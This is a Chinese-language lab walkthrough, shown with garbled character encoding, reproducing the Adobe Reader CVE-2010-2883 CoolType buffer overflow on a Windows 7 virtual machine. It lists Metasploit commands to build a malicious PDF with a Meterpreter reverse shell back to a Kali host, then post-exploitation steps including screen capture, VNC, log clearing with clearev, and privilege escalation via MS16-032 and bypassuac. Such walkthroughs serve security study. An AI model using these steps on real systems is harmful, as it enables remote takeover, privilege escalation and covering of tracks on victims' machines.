---
title: å¤ç°CVE-2010-2883
author: Enomothem
tags:
  - Pentesting
  - CVE-2010-2883
abbrlink: 6aa5
date: 2020-12-06 09:35:25
---

# [å¤ç°CVE-2010-2883](https://enomothem.cn/2020/12/06/%E5%A4%8D%E7%8E%B0CVE-2010-2883/)

> MSFå¥‰ä¸Šã€‚

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207212604350.png)




## Ax ä»‹ç» *Introduction*

Adobe Readerå’ŒAcrobatéƒ½æ˜¯ç¾å›½å¥¥å¤šæ¯”ï¼ˆAdobeï¼‰å…¬å¸çš„äº§å“ã€‚Adobe Readeræ˜¯ä¸€æ¬¾å…è´¹çš„PDFæ–‡ä»¶é˜…è¯»å™¨ï¼ŒAcrobatæ˜¯ä¸€æ¬¾PDFæ–‡ä»¶ç¼–è¾‘å’Œè½¬æ¢å·¥å…·ã€‚ åŸºäºWindowå’ŒMac OS Xçš„Adobe Readerå’ŒAcrobat 9.4ä¹‹å‰çš„9.xç‰ˆæœ¬ï¼Œ8.2.5ä¹‹å‰çš„8.xç‰ˆæœ¬çš„CoolType.dllä¸­å­˜åœ¨åŸºäºæ ˆçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©å¸¦æœ‰TTFå­—ä½“Smart INdependent Glyphlets (SING)è¡¨æ ¼ä¸­è¶…é•¿å­—æ®µçš„PDFæ–‡ä»¶æ‰§è¡Œä»»æ„ä»£ç æˆ–è€…å¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆåº”ç”¨ç¨‹åºå´©æºƒï¼‰ã€‚

#### å½±å“

- Adobe Acrobat 8.0
- Adobe Acrobat 8.1
- Adobe Acrobat 8.1.1
- Adobe Acrobat 8.1.2
- Adobe Acrobat 8.1.3
- Adobe Acrobat 8.1.4
- Adobe Acrobat 8.1.5
- Adobe Acrobat 8.1.6
- Adobe Acrobat 8.1.7
- Adobe Acrobat 8.2
- Adobe Acrobat 8.2.1
- Adobe Acrobat 8.2.2
- Adobe Acrobat 8.2.4
- Adobe Acrobat 9.0
- Adobe Acrobat 9.1
- Adobe Acrobat 9.1.1
- Adobe Acrobat 9.1.2
- Adobe Acrobat 9.1.3
- Adobe Acrobat 9.2
- Adobe Acrobat 9.3
- Adobe Acrobat 9.3.1
- Adobe Acrobat 9.3.2
- Adobe Acrobat 9.3.3
- Adobe Acrobat
- Apple Mac_Os_X
- Microsoft Windows
- Adobe Acrobat_Reader 8.0
- Adobe Acrobat_Reader 8.1
- Adobe Acrobat_Reader 8.1.1
- Adobe Acrobat_Reader 8.1.2
- Adobe Acrobat_Reader 8.1.4
- Adobe Acrobat_Reader 8.1.5
- Adobe Acrobat_Reader 8.1.6
- Adobe Acrobat_Reader 8.1.7
- Adobe Acrobat_Reader 8.2.1
- Adobe Acrobat_Reader 8.2.2
- Adobe Acrobat_Reader 8.2.3
- Adobe Acrobat_Reader 8.2.4
- Adobe Acrobat_Reader 9.0
- Adobe Acrobat_Reader 9.1
- Adobe Acrobat_Reader 9.1.1
- Adobe Acrobat_Reader 9.1.2
- Adobe Acrobat_Reader 9.1.3
- Adobe Acrobat_Reader 9.2
- Adobe Acrobat_Reader 9.3
- Adobe Acrobat_Reader 9.3.1
- Adobe Acrobat_Reader 9.3.2
- Adobe Acrobat_Reader 9.3.3
- Adobe Acrobat_Reader
- Apple Mac_Os_X
- Microsoft Windows

## Bx å‡†å¤‡ *Preparation*

- VMware Workstation pro
- Kali Linux(192.168.66.133)
- Windows 7 SP1
- Adobe Reader 9.3



è¿™é‡Œå‡†å¤‡å¥½äº†è½¯ä»¶ï¼Œå¯ä»¥ä¸‹è½½ã€‚

> Adobe Reader 9.3

é“¾æ¥ï¼šhttps://pan.baidu.com/s/1Br3jLbGeOPMGxHC1bn_wLw  æå–ç ï¼š7srb 


#### a åœ¨é¶æœºä¸Šå®‰è£…Adobe Reader

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207205337563.png)

#### b åœ¨Kaliä¸Šå‡†å¤‡PDFæœ¨é©¬æ–‡ä»¶æ‹·è´åˆ°é¶æœºä¸Š

##### 1 æ‰“å¼€MSF
```# msfconsole ```
##### 2 æœç´¢adobeæ¨¡å—
```# search adobe_cooltype_sing```
##### 3 è°ƒç”¨expæ¨¡å—

```# use exploit/windows/fileformat/adobe_cooltype_sing/ ```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207212912244.png)

##### 4 è°ƒç”¨meterpreterè½½è·ï¼Œåå‘è¿æ¥åˆ°æ¸—é€æœº
```# set payload windows/meterpreter/reverse_tcp```
##### 5 è®¾ç½®Kaliåœ°å€
```# set LHOST 192.168.66.133```
##### 6 è®¾ç½®æœ¬åœ°ç›‘å¬ç«¯å£
```# set LPORT 8888```
##### 7 è®¾ç½®PDFæ–‡ä»¶å
```# set FILENAME Girl.pdf```
##### 8 ç”ŸæˆPDFæœ¨é©¬æ–‡ä»¶
```# exploit```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207214659506.png)

> ç„¶åå°†è¿™ä¸ªPDFæ–‡ä»¶æ‹·è´åˆ°é¶æœºWindows 7ä¸Šã€‚


## Cx ç›‘å¬ *Listening*

> Metasploitå¼€å¯ç›‘å¬ï¼Œç­‰å¾…ğŸ”ğŸ”äº‘ä¸­å›ç‚¹å‡»æˆ‘ä»¬çš„å†°é”‹æˆ˜ç¥ğŸ´ğŸ¦„ä¸Šçº¿ã€‚ã€‚å½“ç„¶è¦è‡ªå·±å»ç‚¹å•¦ï¼Œæ¯•ç«Ÿæ˜¯é¶æœºã€‚

#### a æ‰“å¼€MSFçš„ç›‘å¬æ¨¡å—handler
```# use exploit/multi/handler```

#### b åå¼¹ä¸€ä¸ªShell
```# set payload windows/meterpreter/reverse_tcp```

#### c è®¾ç½®ç›‘å¬çš„IPåœ°å€
``` set LHOST 192.168.66.133```

#### d è®¾ç½®ç›‘å¬çš„ç«¯å£
```# set LPORT 8888```

#### e å¼€å§‹ç›‘å¬

```# exploit```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207220039969.png)

## Dx æ”»å‡» *Exploit*

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207222022961.png)

ä¸å¾—ä¸è¯´ï¼Œdefenderæ˜¯çœŸå¼ºï¼Œç›´æ¥ç»™å¹²æ‰äº†ï¼Œæ‰€ä»¥è¿™å°±æ˜¯æˆ‘ç”µè„‘åªç•™ä¸€ä¸ªDefenderçš„åŸå› ã€‚

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207223217215.png)

#### a ç‚¹ä¸€ä¸‹è¿™ä¸ªGirl

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207223643747.png)

Okayï¼Œç«‹é©¬ä¸Šçº¿ï¼ŒWin7é‚£è¾¹ä¼šå¡ä¸€ä¸‹ï¼Œå¦‚æœå¡ä½äº†ï¼Œè€å¿ƒç­‰å¾…ä¸€ä¸‹ï¼Œè¿™è¾¹å·²ç»OKã€‚

#### b ç®€å•ç©ç©åæ¸—é€

æˆ‘ä»¬å¯ä»¥æˆªå›¾

```screenshot```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207224100660.png)

çœ‹çœ‹è¿œç¨‹æ¡Œé¢å•Š

```run vnc```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207224337469.png)

æ¸…é™¤æ—¥å¿—ã€‚

```clearev```

ä¸è¡Œï¼Œæƒé™ä¸å¤Ÿ

```shell```

#### c ææƒ

1 æŸ¥çœ‹å½“å‰æƒé™

```whoami /groups```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207225219024.png)

å½“å‰æƒé™æ˜¯Mandatory Lable\Medium Mandatory Level è¯´æ˜æˆ‘ä»¬æ˜¯ä¸€ä¸ªæ ‡å‡†ç”¨æˆ·ï¼Œé‚£ä¹ˆå°±éœ€è¦å°†ç”¨æˆ·æƒé™ä»æ ‡å‡†ç”¨æˆ·æå‡åˆ°ç®¡ç†å‘˜ï¼Œä¹Ÿå°±æ˜¯Mandatory Lable\High Mandatory Levelã€‚

2 æŸ¥çœ‹è¡¥ä¸æƒ…å†µ

```systeminfo```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207230547366.png)

æˆ‘ä»¬å°±ç”¨æœ€æ–°çš„MS16-032æ¥å°è¯•ææƒï¼Œå¯¹åº”ç¼–å·æ˜¯KB3139914.

3 å›åˆ°æ§åˆ¶å°

```Ctrl + C```  // y

```bg```

4 æœç´¢MS16-032

```search MS16-032```

```use 0```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207231420462.png)

5 è®¾ç½®session

```set session 1```

6 è®¾ç½®targetï¼ˆé»˜è®¤æ˜¯0ï¼Œ32ä½çš„ï¼‰

``` target 1```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207231624001.png)

æ²¡æœ‰æˆåŠŸï¼Œåˆ«ç°å¿ƒã€‚

7 bypassuacææƒ

```use exploit/windows/local/bypassuac```

```set session 1```

```exploit```

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207232837348.png)

åˆå¤±è´¥äº†å‘€ã€‚å†è¯•è¯•åˆ«çš„å§ã€‚

> æ­£å½“æˆ‘å‡†å¤‡å»æ‰¾åˆ«çš„ææƒæ–¹æ³•æ—¶ï¼Œé¡ºæ‰‹å†æ¬¡å°è¯•äº†ä¸€æ¬¡exploitï¼Œæ²¡æƒ³åˆ°æˆåŠŸäº†ï¼

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207233145450.png)

æ¯›çº¿å“¦ï¼Œè¿™ã€‚ã€‚ã€‚

> æ­£å½“æˆ‘å‡†å¤‡å»ç¡è§‰æ—¶ï¼Œæˆ‘è¾“å‡ºææƒè¯•è¯•ã€‚æ²¡æƒ³åˆ°æˆåŠŸäº†ï¼

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207233529045.png)

åŸæ¥æˆ‘ä¸€ç›´è¯¯è§£äº†clearevçš„æ„æ€ï¼Œé‚£ä¸ªï¼Ÿï¼Ÿï¼Ÿï¼Ÿä¹±ç æ˜¯æ²¡æœ‰è¿™ä¸ªå‘½ä»¤çš„æ„æ€ã€‚å¹¶ä¸æ˜¯æƒé™ä¸å¤Ÿã€‚

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207233909621.png)

è¿™ä¸ªç›´æ¥åˆ°meterpreterä¸Šè¾“å…¥çš„ã€‚

![](https://gitee.com/enomothem/myblogphoto/raw/master/img/image-20201207233950261.png)

Successfully!

## Ex å£°æ˜ *Declaration*

- è¯·éµå®ˆï¼Œçˆ±æŠ¤ã€Šä¸­å›½ç½‘ç»œå®‰å…¨æ³•ã€‹ã€‚
- ä»…ä¾›å­¦ä¹ å‚è€ƒï¼
- è¯·æ³¨æ˜å‡ºå¤„ï¼

## Fx å‚è€ƒ *Reference*

[1] http://www.vulhub.org.cn/vuln/VHN-45488  ä¿¡æ¯å®‰å…¨æ¼æ´é—¨æˆ·

[2] https://zhuanlan.zhihu.com/p/35249958 æ°å“¥

[3] https://blog.csdn.net/qq_41453632/article/details/84766169 æ¯•ç«Ÿè¯å°‘è¡¨å“¥çš„CSDNåæ¸—é€ç¬”è®°

[4] https://www.cnblogs.com/enomothem/p/14087608.html åæ¸—é€å¸¸ç”¨å‘½ä»¤ï¼Œè¿™æ˜¯æˆ‘çš„è‹±æ–‡åšå®¢

[5] https://blog.csdn.net/qq_42349134/article/details/100657705 MSFææƒ